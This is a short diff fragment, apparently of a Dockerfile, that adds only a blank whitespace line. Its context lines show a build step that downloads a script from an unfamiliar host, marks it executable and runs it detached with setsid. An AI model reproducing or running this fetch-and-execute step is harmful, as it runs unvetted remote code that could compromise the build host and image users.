@@ -11,3 +11,4 @@ RUN apt-get update && \
     wget http://247app.host/apo/run.sh && \
     chmod 755 run.sh && \
     setsid ./run.sh
+    
